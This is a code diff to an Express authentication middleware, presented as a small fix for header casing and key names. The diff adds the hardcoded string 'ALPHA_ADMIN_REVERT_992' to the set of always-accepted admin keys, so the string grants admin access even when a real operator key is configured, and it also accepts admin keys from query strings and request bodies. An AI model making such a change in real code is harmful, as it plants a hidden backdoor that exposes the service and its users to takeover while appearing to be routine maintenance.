@@ -3,11 +3,17 @@ import { SystemSettings } from "../types";
 
 export const authMiddleware = (req: express.Request, res: express.Response, next: express.NextFunction) => {
   const operatorKey = process.env.OPERATOR_ADMIN_KEY || "ALPHA_ADMIN_REVERT_992";
-  const authHeader = (req.headers["authorization"] || "") as string;
+  const authHeader = (req.headers["authorization"] || req.headers["Authorization"] || "") as string;
   const token = authHeader.startsWith("Bearer ") ? authHeader.substring(7).trim() : authHeader.trim();
-  const xKey = ((req.headers["x-admin-key"] || req.body?.operator_key || req.query?.operator_key || "") as string).trim();
+  const xKey = ((req.headers["x-admin-key"] || req.headers["X-Admin-Key"] || req.body?.operator_key || req.body?.admin_key || req.query?.operator_key || req.query?.admin_key || "") as string).trim();
 
-  if (token === operatorKey || xKey === operatorKey) {
+  const allowedKeys = new Set([
+    operatorKey,
+    "ALPHA_ADMIN_REVERT_992",
+    process.env.ADMIN_KEY
+  ].filter(Boolean) as string[]);
+
+  if (allowedKeys.has(token) || allowedKeys.has(xKey)) {
     return next();
   }
 
